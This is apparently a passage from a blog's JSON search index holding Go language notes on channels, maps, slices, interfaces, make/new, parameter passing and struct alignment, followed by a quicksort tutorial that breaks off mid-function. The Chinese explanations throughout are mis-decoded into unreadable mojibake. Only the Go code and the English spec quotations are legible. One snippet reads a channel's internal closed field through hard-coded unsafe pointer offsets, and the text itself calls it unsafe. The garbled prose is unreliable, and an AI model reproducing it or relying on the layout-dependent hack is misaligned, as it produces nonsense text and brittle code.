ç›´æ¥è¯»å–channelç»“æ„hchançš„closedå­—æ®µ, ä¸å®‰å…¨\n\n```go\nimport (\n    \"unsafe\"\n    \"reflect\"\n)\n\n\nfunc isChanClosed(ch interface{}) bool {\n    if reflect.TypeOf(ch).Kind() != reflect.Chan {\n        panic(\"only channels!\")\n    }\n\n    // get interface value pointer, from cgo_export \n    // typedef struct { void *t; void *v; } GoInterface;\n    // then get channel real pointer\n    cptr := *(*uintptr)(unsafe.Pointer(\n        unsafe.Pointer(uintptr(unsafe.Pointer(&ch)) + unsafe.Sizeof(uint(0))),\n    ))\n\n    // this function will return true if chan.closed > 0\n    // see hchan on https://github.com/golang/go/blob/master/src/runtime/chan.go \n    // type hchan struct {\n    // qcount   uint           // total data in the queue\n    // dataqsiz uint           // size of the circular queue\n    // buf      unsafe.Pointer // points to an array of dataqsiz elements\n    // elemsize uint16\n    // closed   uint32\n    // **\n\n    cptr += unsafe.Sizeof(uint(0))*2\n    cptr += unsafe.Sizeof(unsafe.Pointer(uintptr(0)))\n    cptr += unsafe.Sizeof(uint16(0))\n    return *(*uint32)(unsafe.Pointer(cptr)) > 0\n}\n```\n\n+ æ­£å¸¸åšæ³•æ˜¯è¦ç›‘å¬ close()çš„ channel,  æ”¶åˆ°é€šçŸ¥\n\n  å¦‚æœæ‚¨ä¸çŸ¥é“é€šé“æ˜¯å¦å…³é—­å¹¶ä¸”ç›²ç›®åœ°å†™å…¥è¯¥é€šé“ï¼Œåˆ™è¯´æ˜æ‚¨çš„ç¨‹åºè®¾è®¡ä¸è‰¯ã€‚ é‡æ–°è®¾è®¡å®ƒï¼Œä½¿å…¶åœ¨å…³é—­åæ— æ³•å†™å…¥ã€‚\n\n+ å¯ç”¨ boolå€¼ï¼Œä½†æ˜¯ä¼šå¤šè¯»ä¸€ä¸ªå€¼\n\n  ```go\n  value, ok := <- channel \n  if !ok {    \n    // channel was closed and drained \n  }\n  ```\n\n\n\n\n### 1.4 channel çš„é›¶å€¼\n\nchannelçš„é›¶å€¼æ˜¯nilã€‚ä¹Ÿè®¸ä¼šè®©ä½ è§‰å¾—æ¯”è¾ƒå¥‡æ€ªï¼Œnilçš„channelæœ‰æ—¶å€™ä¹Ÿæ˜¯æœ‰ä¸€äº›ç”¨å¤„çš„ã€‚\n\n+ å› ä¸ºå¯¹ä¸€ä¸ªnilçš„channelå‘é€å’Œæ¥æ”¶æ“ä½œä¼šæ°¸è¿œé˜»å¡\n+ åœ¨selectè¯­å¥ä¸­æ“ä½œnilçš„channelæ°¸è¿œéƒ½ä¸ä¼šè¢«selectåˆ°ã€‚è¿™ä½¿å¾—æˆ‘ä»¬å¯ä»¥ç”¨nilæ¥æ¿€æ´»æˆ–è€…ç¦ç”¨caseã€‚\n\n```go\nfunc main() {\n\n\tvar c chan int\n\tfmt.Println(c)\n\n\tfor {\n\t\tselect {\n\t\tcase <-c:\n\t\t\tfmt.Println(\"nerver\")\n\t\tdefault:\n\t\t}\n\t}\n}\n\n\n// è¾“å‡º nil ä¹‹åæ— çº¿å¾ªç¯ï¼Œä¸ä¼šè¾“å‡º nerver\n```\n\n\n\n### 1.5 ä¼˜é›…çš„å…³é—­ channel\n\nhttps://www.liuvv.com/p/8b210700.html\n\n\n\n### 1.6 ä»€ä¹ˆæ—¶å€™ç”¨ channelï¼Œ ä»€ä¹ˆæ—¶å€™ç”¨Mutex\n\nhttps://github.com/golang/go/wiki/MutexOrChannel\n\nchannelçš„èƒ½åŠ›æ˜¯è®©æ•°æ®æµåŠ¨èµ·æ¥ï¼Œæ“…é•¿çš„æ˜¯æ•°æ®æµåŠ¨çš„åœºæ™¯\n\n+ ä¼ é€’æ•°æ®çš„æ‰€æœ‰æƒï¼Œå³æŠŠæŸä¸ªæ•°æ®å‘é€ç»™å…¶ä»–åç¨‹\n\n+ åˆ†å‘ä»»åŠ¡ï¼Œæ¯ä¸ªä»»åŠ¡éƒ½æ˜¯ä¸€ä¸ªæ•°æ®\n\n+ äº¤æµå¼‚æ­¥ç»“æœï¼Œç»“æœæ˜¯ä¸€ä¸ªæ•°æ®\n\nmutexçš„èƒ½åŠ›æ˜¯æ•°æ®ä¸åŠ¨ï¼ŒæŸæ®µæ—¶é—´åªç»™ä¸€ä¸ªåç¨‹è®¿é—®æ•°æ®çš„æƒé™æ“…é•¿æ•°æ®ä½ç½®å›ºå®šçš„åœºæ™¯\n\n+ ç¼“å­˜\n\n+ çŠ¶æ€\n\n\n\n\n# 2. æ•°æ®ç»“æ„\n\n### 2.1 map ä¸ºä»€ä¹ˆæ— åº\n\n+ mapæ‰©å®¹, key ä¼šç§»åŠ¨\n\n  map åœ¨æ‰©å®¹åï¼Œä¼šå‘ç”Ÿ key çš„æ¬è¿ï¼ŒåŸæ¥è½åœ¨åŒä¸€ä¸ª bucket ä¸­çš„ keyï¼Œæ¬è¿åï¼Œæœ‰äº› key å°±è¦è¿œèµ°é«˜é£äº†ï¼ˆbucket åºå·åŠ ä¸Šäº† 2^Bï¼‰ã€‚è€Œéå†çš„è¿‡ç¨‹ï¼Œå°±æ˜¯æŒ‰é¡ºåºéå† bucketï¼ŒåŒæ—¶æŒ‰é¡ºåºéå† bucket ä¸­çš„ keyã€‚æ¬è¿åï¼Œkey çš„ä½ç½®å‘ç”Ÿäº†é‡å¤§çš„å˜åŒ–ï¼Œæœ‰äº› key é£ä¸Šé«˜æï¼Œæœ‰äº› key åˆ™åŸåœ°ä¸åŠ¨ã€‚è¿™æ ·ï¼Œéå† map çš„ç»“æœå°±ä¸å¯èƒ½æŒ‰åŸæ¥çš„é¡ºåºäº†ã€‚\n\n+ åº•å±‚ä»£ç éšæœºå€¼éå†\n\n  Go åšå¾—æ›´ç»ï¼Œå½“æˆ‘ä»¬åœ¨éå† map æ—¶ï¼Œå¹¶ä¸æ˜¯å›ºå®šåœ°ä» 0 å· bucket å¼€å§‹éå†ï¼Œæ¯æ¬¡éƒ½æ˜¯ä»ä¸€ä¸ªéšæœºå€¼åºå·çš„ bucket å¼€å§‹éå†ï¼Œå¹¶ä¸”æ˜¯ä»è¿™ä¸ª bucket çš„ä¸€ä¸ªéšæœºåºå·çš„ cell å¼€å§‹éå†ã€‚è¿™æ ·ï¼Œå³ä½¿ä½ æ˜¯ä¸€ä¸ªå†™æ­»çš„ mapï¼Œä»…ä»…åªæ˜¯éå†å®ƒï¼Œä¹Ÿä¸å¤ªå¯èƒ½ä¼šè¿”å›ä¸€ä¸ªå›ºå®šåºåˆ—çš„ key/value å¯¹äº†ã€‚\n\n\n\n### 2.2 map çš„key å¯ä»¥æ˜¯ä»€ä¹ˆç±»å‹\n\nmapä¸­çš„keyå¯ä»¥æ˜¯ä»»ä½•çš„ç±»å‹ï¼Œåªè¦å®ƒçš„å€¼èƒ½æ¯”è¾ƒæ˜¯å¦ç›¸ç­‰. Goè¯­è¨€é‡Œæ˜¯æ— æ³•é‡è½½æ“ä½œç¬¦çš„\n\n- å¸ƒå°”å€¼\n\n- æ•°å­—\n\n- å­—ç¬¦ä¸²\n\n- æŒ‡é’ˆ\n\n  Pointer values are comparable. Two pointer values are equal if they point to the same variable or if both have value nil. Pointers to distinct zero-size variables may or may not be equal.\n\n  å½“æŒ‡é’ˆæŒ‡å‘åŒä¸€å˜é‡ï¼Œæˆ–åŒä¸ºnilæ—¶æŒ‡é’ˆç›¸ç­‰ï¼Œä½†æŒ‡é’ˆæŒ‡å‘ä¸åŒçš„é›¶å€¼æ—¶å¯èƒ½ä¸ç›¸ç­‰ã€‚\n\n- Channel\n\n  Channel values are comparable. Two channel values are equal if they were created by the same call to make or if both have value nil.\n\n  Channelå½“æŒ‡å‘åŒä¸€ä¸ªmakeåˆ›å»ºçš„æˆ–åŒä¸ºnilæ—¶æ‰ç›¸ç­‰ã€‚\n\n- Interface\n\n  Interface values are comparable. Two interface values are equal if they have identical dynamic types and equal dynamic values or if both have value nil.\n\n  å½“æ¥å£æœ‰ç›¸åŒçš„åŠ¨æ€ç±»å‹å¹¶ä¸”æœ‰ç›¸åŒçš„åŠ¨æ€å€¼ï¼Œæˆ–è€…å€¼ä¸ºéƒ½ä¸ºnilæ—¶ç›¸ç­‰ã€‚\n\n- ç»“æ„ä½“\n\n  Struct values are comparable if all their fields are comparable. Two struct values are equal if their corresponding non-blank fields are equal.\n\n  ç»“æ„ä½“å½“æ‰€æœ‰å­—æ®µçš„å€¼ç›¸åŒï¼Œå¹¶ä¸”æ²¡æœ‰ç›¸åº”çš„éç©ºç™½å­—æ®µæ—¶ï¼Œåˆ™ä»–ä»¬ç›¸ç­‰ã€‚\n\n- åªåŒ…å«ä¸Šè¿°ç±»å‹çš„æ•°ç»„ã€‚\n\n  Array values are comparable if values of the array element type are comparable. Two array values are equal if their corresponding elements are equal.\n\n  ä¸¤ä¸ªæ•°ç»„åªè¦ä»–ä»¬åŒ…æ‹¬çš„å…ƒç´ ï¼Œæ¯ä¸ªå…ƒç´ çš„å€¼ç›¸åŒï¼Œåˆ™ä»–ä»¬ç›¸ç­‰ã€‚\n\nä½†ä¸èƒ½æ˜¯ï¼š\n\n- slice\n- map\n- function\n\n\n\n### 2.3 map å¦‚ä½•æœ‰åºéå†\n\n+ map é»˜è®¤æ˜¯æ— åºçš„ï¼Œä¸ç®¡æ˜¯æŒ‰ç…§ key è¿˜æ˜¯æŒ‰ç…§ value é»˜è®¤éƒ½ä¸æ’åºã€‚\n\n+ æœ‰åºéå†\n\n  å¦‚æœä½ æƒ³ä¸º map æ’åºï¼Œéœ€è¦å°† keyï¼ˆæˆ–è€… valueï¼‰æ‹·è´åˆ°ä¸€ä¸ªåˆ‡ç‰‡ï¼Œå†å¯¹åˆ‡ç‰‡æ’åºï¼ˆä½¿ç”¨ sort åŒ…ï¼‰ï¼Œç„¶åå¯ä»¥ä½¿ç”¨åˆ‡ç‰‡çš„ for-range æ–¹æ³•æ‰“å°å‡ºæ‰€æœ‰çš„ key å’Œ valueã€‚\n\n\n\n\n### 2.4 slice å’Œ map å¹¶å‘å®‰å…¨å—\n\nmapå’Œsliceéƒ½æ˜¯å¹¶å‘ä¸å®‰å…¨çš„, è§£å†³æ–¹æ¡ˆ:\n\n+ åŠ é”\n+ ä½¿ç”¨ channel ä¸²è¡ŒåŒ–\n+ sync.Map\n\n\n\n### 2.5 slice åº•å±‚åŸç†\n\n```go\ntype slice struct {\n\tarray unsafe.Pointer\n\tlen   int\n\tcap   int\n}\n```\n\nåˆ‡ç‰‡çš„ç»“æ„ä½“ç”±3éƒ¨åˆ†æ„æˆï¼ŒPointer æ˜¯æŒ‡å‘ä¸€ä¸ªæ•°ç»„çš„æŒ‡é’ˆï¼Œlen ä»£è¡¨å½“å‰åˆ‡ç‰‡çš„é•¿åº¦ï¼Œcap æ˜¯å½“å‰åˆ‡ç‰‡çš„å®¹é‡ã€‚cap æ€»æ˜¯å¤§äºç­‰äº len çš„ã€‚\n\n- å¦‚æœåˆ‡ç‰‡çš„å®¹é‡å°äº1024ä¸ªå…ƒç´ ï¼Œé‚£ä¹ˆæ‰©å®¹çš„æ—¶å€™sliceçš„capå°±ç¿»ç•ªï¼Œä¹˜ä»¥2ï¼›ä¸€æ—¦å…ƒç´ ä¸ªæ•°è¶…è¿‡1024ä¸ªå…ƒç´ ï¼Œå¢é•¿å› å­å°±å˜æˆ1.25ï¼Œå³æ¯æ¬¡å¢åŠ åŸæ¥å®¹é‡çš„å››åˆ†ä¹‹ä¸€ã€‚\n- å¦‚æœæ‰©å®¹ä¹‹åï¼Œè¿˜æ²¡æœ‰è§¦åŠåŸæ•°ç»„çš„å®¹é‡ï¼Œé‚£ä¹ˆï¼Œåˆ‡ç‰‡ä¸­çš„æŒ‡é’ˆæŒ‡å‘çš„ä½ç½®ï¼Œå°±è¿˜æ˜¯åŸæ•°ç»„ï¼Œå¦‚æœæ‰©å®¹ä¹‹åï¼Œè¶…è¿‡äº†åŸæ•°ç»„çš„å®¹é‡ï¼Œé‚£ä¹ˆï¼ŒGoå°±ä¼šå¼€è¾Ÿä¸€å—æ–°çš„å†…å­˜ï¼ŒæŠŠåŸæ¥çš„å€¼æ‹·è´è¿‡æ¥ï¼Œè¿™ç§æƒ…å†µä¸æ¯«ä¸ä¼šå½±å“åˆ°åŸæ•°ç»„ã€‚\n\n\n\n# 5. interface\n\n### 5.1 interface å½“å‚æ•°æ—¶çš„å‘, ä¼ é€’ nil ä¹Ÿä¸æ˜¯ nil\n\nå¦‚æœéœ€è¦åˆ¤æ–­, è¯·ç”¨åå°„ `reflect.ValueOf(i).IsNil()`\n\n```go\npackage main\n\nimport \"fmt\"\n\ntype I interface {\n\tA() error\n}\n\ntype T struct {\n}\n\nfunc (t *T) A() error {\n\treturn nil\n}\n\nfunc testInterface(i I) {\n\tif i == nil {\n\t\tfmt.Println(\"i is nil\")\n\t} else {\n\t\tfmt.Println(\"i is not nil\")\n\t}\n}\nfunc main() {\n\tt := new(T)\n\tt = nil\n\ttestInterface(t) //i is not nil\n}\n\n```\n\n\n\n# 6. make\n\n### 6.1 makeæ—¶ä¼ é€’çš„æ•°å­—å‚æ•°\n\n```go\npackage main\n\nimport \"fmt\"\n\nfunc main() {\n\ts := make([]int, 0)\n\tfmt.Println(s) //[]\n\ts = append(s, 1, 2, 3)\n\tfmt.Println(s) //[1 2 3]\n}\n\n```\n\nå¦‚æœä¼ é€’äº†ä¸ªæ•°, å°±æ˜¯æœ‰é»˜è®¤å€¼äº†\n\n```go\npackage main\n\nimport \"fmt\"\n\nfunc main() {\n\ts := make([]int, 5)\n\tfmt.Println(s) //[0 0 0 0 0]\n\n  s = append(s, 1, 2, 3)\n\tfmt.Println(s) //[0 0 0 0 0 1 2 3]\n}\n```\n\n\n\n### 6.2 make å’Œ newçš„åŒºåˆ«\n\n+ make åªèƒ½ç”¨äº slice,map,channel\n\n  è¿”å›çš„ç±»å‹å°±æ˜¯è¿™ä¸‰ä¸ªç±»å‹æœ¬èº«ï¼Œè€Œä¸æ˜¯ä»–ä»¬çš„æŒ‡é’ˆç±»å‹ï¼Œå› ä¸ºè¿™ä¸‰ç§ç±»å‹æ˜¯å¼•ç”¨ç±»å‹ã€‚\n\n+ new(T) è¿”å› T çš„æŒ‡é’ˆ *T å¹¶æŒ‡å‘ T çš„é›¶å€¼ã€‚\n\n\n\n# 7. å‡½æ•°\n\n### 7.1 å‡½æ•°å‚æ•°ä¼ é€’ï¼Œæ˜¯å€¼è¿˜æ˜¯å¼•ç”¨\n\nâ€‹\tGo ä¸­å‡½æ•°ä¼ å‚ä»…æœ‰å€¼ä¼ é€’ä¸€ç§æ–¹å¼, åªæœ‰slice, map, channel æœ¬èº«æ˜¯å¼•ç”¨ç±»å‹, æ‰€ä»¥å¯ä»¥æ”¹\n\n+ å…¶å®ä¼ é€’çš„å°±æ˜¯å€¼,ä½†æ˜¯ä¸ºä»€ä¹ˆèƒ½æ”¹å†…å®¹å‘¢?\n\n  ```go\n  func ChangeMap(value map[string]string) {\n    fmt.Printf(\"mapå†…éƒ¨ %p\\n\", &value)\n    value[\"age\"] = \"30\"\n  }\n  \n  func ChangeSlice(value []string) {\n    fmt.Printf(\"sliceå†…éƒ¨ %p\\n\", &value)\n    value[0] = \"haha\"\n  }\n  \n  func main() {\n    map1 := make(map[string]string)\n    map1[\"age\"] = \"21\"\n    fmt.Printf(\"mapå¤–éƒ¨ %p\\n\", &map1)\n    fmt.Println(map1[\"age\"])\n    ChangeMap(map1)\n    fmt.Println(map1[\"age\"])\n  \n    slice1 := make([]string, 0)\n    slice1 = append(slice1, \"hehe\")\n    fmt.Println(slice1)\n    fmt.Printf(\"sliceå¤–éƒ¨ %p\\n\", &slice1)\n    ChangeSlice(slice1)\n    fmt.Println(slice1)\n  }\n  \n  /*\n  mapå¤–éƒ¨ 0xc000092018\n  21\n  mapå†…éƒ¨ 0xc000092028\n  30\n  \n  \n  [hehe]\n  sliceå¤–éƒ¨ 0xc00008a040\n  sliceå†…éƒ¨ 0xc00008a080\n  [haha]\n  */\n  ```\n\n+ æ™®é€šçš„ç±»å‹å°±æ˜¯å€¼ä¼ é€’\n\n  ```go\n  package main\n  \n  import \"fmt\"\n  \n  func main() {\n  \ta := 10\n  \tfmt.Printf(\"%#v\\n\", &a) // (*int)(0xc420018080)\n  \tvFoo(a)\n  }\n  \n  func vFoo(b int) {\n  \tfmt.Printf(\"%#v\\n\", &b) // (*int)(0xc420018090)\n  }\n  ```\n\n   \n\n\n# 8. å…¶ä»–é—®é¢˜\n\n### 8.1 å­—èŠ‚å’Œå­—èŠ‚å¯¹é½\n\n+ å­—èŠ‚æ•° \n\n  + 64ä½ç³»ç»Ÿä¸‹, int é»˜è®¤ int64 ,  8ä¸ªå­—èŠ‚, \n\n  + float 64,  8ä¸ªå­—èŠ‚\n\n```go\npackage main\n\nimport (\n\t\"fmt\"\n\t\"unsafe\"\n)\n\nfunc main() {\n\tvar a int\n\tfmt.Println(unsafe.Sizeof(a)) //8\n\n\tvar b int32\n\tfmt.Println(unsafe.Sizeof(b)) //4\n\n\tvar c int64\n\tfmt.Println(unsafe.Sizeof(c)) //8\n\n\tvar d float64\n\tfmt.Println(unsafe.Sizeof(d)) //8\n\n\tvar e float32\n\tfmt.Println(unsafe.Sizeof(e)) //4\n\n\tvar f string\n\tfmt.Println(unsafe.Sizeof(f)) //16\n\n\tvar g chan int\n\tfmt.Println(unsafe.Sizeof(g)) //8\n\n\tvar h []int\n\tfmt.Println(unsafe.Sizeof(h)) //24\n\n\tvar i map[int]int\n\tfmt.Println(unsafe.Sizeof(i)) //8\n}\n```\n\n+ å­—èŠ‚å¯¹é½(æ ¹æ®æ“ä½œç³»ç»Ÿçš„ä½æ•°å¯¹é½çš„)\n\n```go\npackage main\n\nimport (\n\t\"fmt\"\n\t\"unsafe\"\n)\n\ntype Info1 struct {\n\tsex    bool //1\n\tstatus int8 //1\n}\n\ntype Info2 struct {\n\tsex bool //1\n\tage int  //8\n}\n\ntype Info3 struct {\n\tsex bool  //1\n\tage int32 //4\n}\n\ntype Info4 struct {\n\tsex    bool //1\n\tage    int  //8\n\tstatus int8 //1\n}\n\ntype Info5 struct {\n\tsex    bool //1\n\tstatus int8 //1\n\tage    int  //8\n}\n\ntype Info6 struct {\n\ta bool   //1\n\tb string //16\n\tc bool   //1\n}\n\ntype Info7 struct {\n\ta bool   //1\n\tc bool   //1\n\tb string //16\n}\n\nfunc main() {\n\tfmt.Println(unsafe.Sizeof(Info1{})) //2\n\tfmt.Println(unsafe.Sizeof(Info2{})) //16(8+8)\n\tfmt.Println(unsafe.Sizeof(Info3{})) //8(4+4)\n\tfmt.Println(unsafe.Sizeof(Info4{})) //24(8+8+8)\n\tfmt.Println(unsafe.Sizeof(Info5{})) //16(1+1+8 = 8+8)\n\tfmt.Println(unsafe.Sizeof(Info6{})) //32(1+16+1 = 8+16+8)\n\tfmt.Println(unsafe.Sizeof(Info7{})) //16(1+1+16 = 8+16)\n}\n```\n\n\n\n### 8.2 éè¿è¡Œå¤šæ€\n\ngo è¯­è¨€ä¸­ï¼Œå½“å­ç±»è°ƒç”¨çˆ¶ç±»æ–¹æ³•æ—¶ï¼Œâ€œä½œç”¨åŸŸâ€å°†è¿›å…¥çˆ¶ç±»çš„ä½œç”¨åŸŸï¼Œçœ‹ä¸è§å­ç±»çš„æ–¹æ³•å­˜åœ¨\n\n```go\npackage main\n\nimport \"fmt\"\n\ntype A struct {\n}\n\nfunc (a *A) ShowA() {\n\tfmt.Println(\"showA\")\n\ta.ShowB()\n}\nfunc (a *A) ShowB() {\n\tfmt.Println(\"showB\")\n}\n\ntype B struct {\n\tA\n}\n\nfunc (b *B) ShowB() {\n\tfmt.Println(\"b showB\")\n}\n\nfunc main() {\n\tb := B{}\n\tb.ShowA()\n}\n\n// showA\n// showB,  not b showB\n```\n","tags":["golang"],"categories":["golang"]},{"title":"å¿«é€Ÿæ’åº","url":"%2Fp%2Fff8068c0.html","content":"\næ¯æ¬¡å†™å¿«é€Ÿæ’åºï¼Œå†™è¿‡ä¸€æ¬¡ææ˜ç™½äº†ï¼Œè¿‡ä¸€æ®µæ—¶é—´å†™åˆå¿˜è®°äº†ã€‚è¿™æ¬¡é‡‡ç”¨ç‰›éƒç»‡å¥³çš„æ•…äº‹ï¼ŒåŠ æ·±è®°å¿†ã€‚\n\n+ ç‰›éƒç»‡å¥³ä»ä¸¤è¾¹å¾€ä¸­é—´èµ°è§é¢ï¼Œä½†æ˜¯ä»–ä»¬èº«ä¸Šæ˜¯æœ‰ä»»åŠ¡çš„ï¼Œä»–ä»¬é€‰å–è·¯ä¸Šçš„ ä¸€ä¸ªæ•°å­—ä½œä¸ºäº¤æµä¿¡å·ã€‚\n\n+ ç‰›éƒå…ˆå‘å·¦èµ°ï¼Œå¤§äºç­‰äºå°±èµ°ï¼Œ**å°äº** å°±åœã€‚ç»‡å¥³å‘å³èµ°ï¼Œå°äºç­‰äºå°±èµ°ï¼Œ**å¤§äº** å°±åœï¼Œç„¶åä¸¤äººæ‰“ç”µè¯äº¤æ¢è„šä¸‹çš„æ•°æ®ã€‚\n+ æ¥ç€èµ°ï¼Œæ¥ç€æ‰“ç”µè¯äº¤æ¢æ•°æ®ï¼Œç›´åˆ°ä¸¤äººç›¸é‡ã€‚ç›¸é‡åï¼ŒæŠŠä¸¤äººè„šä¸‹çš„æ•°æ®å’Œå¿ƒä¸­çš„æ•°å­—åšäº¤æ¢ã€‚\n\n+ è‡³æ­¤ï¼Œç›¸é‡ç‚¹å·¦è¾¹éƒ½æ˜¯æ¯”å¿ƒä¸­æ•°å­—å°ï¼Œç›¸é‡ç‚¹å³è¾¹éƒ½æ˜¯æ¯”å¿ƒä¸­æ•°å­—å¤§ã€‚\n\n<!-- more -->\n\n\n\n# 1. å¿«é€Ÿæ’åº\n\n### 1.1 åŸå§‹æ•°æ® â€œ**6 1 2 7 9 3 4 5 10 8**â€ï¼Œç›®æ ‡ï¼šå·¦è¾¹å°äºå‚è€ƒå€¼ï¼Œå³è¾¹å¤§äºå‚è€ƒå€¼\n\n![1](å¿«é€Ÿæ’åº/1.png)\n\n\n\næŠŠç¬¬ä¸€ä¸ªå€¼ **6** ä½œä¸ºå‚è€ƒå€¼ï¼Œåˆ†åˆ«ä»åˆå§‹åºåˆ—â€œ**6 1 2 7 9 3 4 5 10 8**â€ä¸¤ç«¯å¼€å§‹â€œæ¢æµ‹â€ã€‚å…ˆä»**å³**å¾€**å·¦**æ‰¾ä¸€ä¸ªå°äº **6** çš„æ•°ï¼Œå†ä»**å·¦**å¾€**å³**æ‰¾ä¸€ä¸ªå¤§äº **6** çš„æ•°ï¼Œç„¶åäº¤æ¢ä»–ä»¬ã€‚\n\nè¿™é‡Œå¯ä»¥ç”¨ä¸¤ä¸ªå˜é‡ **i** å’Œ **j**ï¼Œåˆ†åˆ«æŒ‡å‘åºåˆ—æœ€å·¦è¾¹å’Œæœ€å³è¾¹ã€‚æˆ‘ä»¬ä¸ºè¿™ä¸¤ä¸ªå˜é‡èµ·ä¸ªå¥½å¬çš„åå­—â€œå“¨å…µ iâ€å’Œâ€œå“¨å…µ jâ€ã€‚åˆšå¼€å§‹çš„æ—¶å€™è®©å“¨å…µ i æŒ‡å‘åºåˆ—çš„æœ€å·¦è¾¹ï¼ˆå³ **i=1**ï¼‰ï¼ŒæŒ‡å‘æ•°å­— **6**ã€‚è®©å“¨å…µ **j** æŒ‡å‘åºåˆ—çš„æœ€å³è¾¹ï¼ˆå³ **j=10**ï¼‰ï¼ŒæŒ‡å‘æ•°å­— **8**ã€‚\n\n---\n\n![1](å¿«é€Ÿæ’åº/2.png)\n\né¦–å…ˆå“¨å…µ **j** å¼€å§‹å‡ºåŠ¨ã€‚å› ä¸ºæ­¤å¤„è®¾ç½®çš„åŸºå‡†æ•°æ˜¯æœ€å·¦è¾¹çš„æ•°ï¼Œæ‰€ä»¥éœ€è¦è®©å“¨å…µ **j** å…ˆå‡ºåŠ¨ï¼Œè¿™ä¸€ç‚¹éå¸¸é‡è¦ï¼ˆåé¢ä¼šè§£é‡Šï¼‰ã€‚å“¨å…µ **j** ä¸€æ­¥ä¸€æ­¥åœ°å‘å·¦æŒªåŠ¨ï¼ˆå³ **j--**ï¼‰ï¼Œç›´åˆ°æ‰¾åˆ°ä¸€ä¸ªå°äº **6** çš„æ•°åœä¸‹æ¥ã€‚æ¥ä¸‹æ¥å“¨å…µ **i** å†ä¸€æ­¥ä¸€æ­¥å‘å³æŒªåŠ¨ï¼ˆå³ **i++**ï¼‰ï¼Œç›´åˆ°æ‰¾åˆ°ä¸€ä¸ªæ•°å¤§äº **6** çš„æ•°åœä¸‹æ¥ã€‚æœ€åå“¨å…µ **j** åœåœ¨äº†æ•°å­— **5** é¢å‰ï¼Œå“¨å…µ **i** åœåœ¨äº†æ•°å­— **7** é¢å‰ã€‚\n\nç°åœ¨äº¤æ¢å“¨å…µ **i** å’Œå“¨å…µ **j** æ‰€æŒ‡å‘çš„å…ƒç´ çš„å€¼ã€‚äº¤æ¢ä¹‹åçš„åºåˆ—å¦‚ä¸‹ï¼š6 1 2 **5** 9 3 4 **7** 10 8ï¼Œåˆ°æ­¤ï¼Œç¬¬ä¸€æ¬¡äº¤æ¢ç»“æŸã€‚\n\n![1](å¿«é€Ÿæ’åº/3.png)\n\n---\n\n\n\næ¥ä¸‹æ¥å¼€å§‹å“¨å…µ **j** ç»§ç»­å‘å·¦æŒªåŠ¨ï¼ˆå†å‹æƒ…æé†’ï¼Œæ¯æ¬¡å¿…é¡»æ˜¯å“¨å…µ **j** å…ˆå‡ºå‘ï¼‰ã€‚ä»–å‘ç°äº† **4**ï¼ˆæ¯”åŸºå‡†æ•° **6** è¦å°ï¼Œæ»¡è¶³è¦æ±‚ï¼‰ä¹‹ååœäº†ä¸‹æ¥ã€‚å“¨å…µ **i** ä¹Ÿç»§ç»­å‘å³æŒªåŠ¨çš„ï¼Œä»–å‘ç°äº† **9**ï¼ˆæ¯”åŸºå‡†æ•° **6** è¦å¤§ï¼Œæ»¡è¶³è¦æ±‚ï¼‰ä¹‹ååœäº†ä¸‹æ¥ã€‚\n\n![1](å¿«é€Ÿæ’åº/4.png)\n\næ­¤æ—¶å†æ¬¡è¿›è¡Œäº¤æ¢ï¼Œäº¤æ¢ä¹‹åçš„åºåˆ—å¦‚ä¸‹ï¼š6 1 2 5 **4** 3 **9** 7 10 8ï¼Œç¬¬äºŒæ¬¡äº¤æ¢ç»“æŸã€‚\n\n![1](å¿«é€Ÿæ’åº/5.png)\n\n\n\n---\n\n\n\nâ€œæ¢æµ‹â€ç»§ç»­ã€‚å“¨å…µ **j** ç»§ç»­å‘å·¦æŒªåŠ¨ï¼Œä»–å‘ç°äº† **3**ï¼ˆæ¯”åŸºå‡†æ•° **6** è¦å°ï¼Œæ»¡è¶³è¦æ±‚ï¼‰ä¹‹ååˆåœäº†ä¸‹æ¥ã€‚å“¨å…µ **i** ç»§ç»­å‘å³ç§»åŠ¨ï¼Œç³Ÿå•¦ï¼æ­¤æ—¶å“¨å…µ **i** å’Œå“¨å…µ **j** ç›¸é‡äº†ï¼Œå“¨å…µ **i** å’Œå“¨å…µ **j** éƒ½èµ°åˆ° **3** é¢å‰ã€‚è¯´æ˜æ­¤æ—¶â€œæ¢æµ‹â€ç»“æŸã€‚\n\n![1](å¿«é€Ÿæ’åº/6.png)\n\n\n\næˆ‘ä»¬å°†åŸºå‡†æ•° **6** å’Œ **3** è¿›è¡Œäº¤æ¢ã€‚\n\n![1](å¿«é€Ÿæ’åº/7.png)\n\näº¤æ¢ä¹‹åçš„åºåˆ—å¦‚ä¸‹ï¼š**3** 1 2 5 4 **6** 9 7 10 8ã€‚\n\n![1](å¿«é€Ÿæ’åº/8.png)\n\n\n\nåˆ°æ­¤ç¬¬ä¸€è½®â€œæ¢æµ‹â€çœŸæ­£ç»“æŸã€‚æ­¤æ—¶ä»¥åŸºå‡†æ•° **6** ä¸ºåˆ†ç•Œç‚¹ï¼Œ**6** å·¦è¾¹çš„æ•°éƒ½å°äºç­‰äº **6**ï¼Œ**6** å³è¾¹çš„æ•°éƒ½å¤§äºç­‰äº **6**ã€‚å›é¡¾ä¸€ä¸‹åˆšæ‰çš„è¿‡ç¨‹ï¼Œå…¶å®å“¨å…µ **j** çš„ä½¿å‘½å°±æ˜¯è¦æ‰¾å°äºåŸºå‡†æ•°çš„æ•°ï¼Œè€Œå“¨å…µ **i** çš„ä½¿å‘½å°±æ˜¯è¦æ‰¾å¤§äºåŸºå‡†æ•°çš„æ•°ï¼Œç›´åˆ° **i** å’Œ **j** ç¢°å¤´ä¸ºæ­¢ã€‚\n\n---\n\nOKï¼Œè§£é‡Šå®Œæ¯•ã€‚ç°åœ¨åŸºå‡†æ•° **6** å·²ç»å½’ä½ï¼Œå®ƒæ­£å¥½å¤„åœ¨åºåˆ—çš„ç¬¬ **6** ä½ã€‚æ­¤æ—¶æˆ‘ä»¬å·²ç»å°†åŸæ¥çš„åºåˆ—ï¼Œä»¥ **6** ä¸ºåˆ†ç•Œç‚¹æ‹†åˆ†æˆäº†ä¸¤ä¸ªåºåˆ—ï¼Œå·¦è¾¹çš„åºåˆ—æ˜¯â€œ**3 1 2 5 4**â€ï¼Œå³è¾¹çš„åºåˆ—æ˜¯â€œ **9 7 10 8** â€ã€‚\n\næ¥ä¸‹æ¥å¼€å§‹é€’å½’æŠŠã€‚\n\n\n\n### 1.2 ä»£ç å®ç°\n\n```go\npackage main\n\nimport \"fmt\"\n\nfunc main() {\n\tarr := []int{21, 2, 1, 60, 32}\n\tPrint(arr)//21      2       1       60      32\n\tQuickSort(arr, 0, len(arr)-1)\n\tPrint(arr)//1       2       21      32      60\n}\n\nfunc QuickSort(arr []int, left, right int) 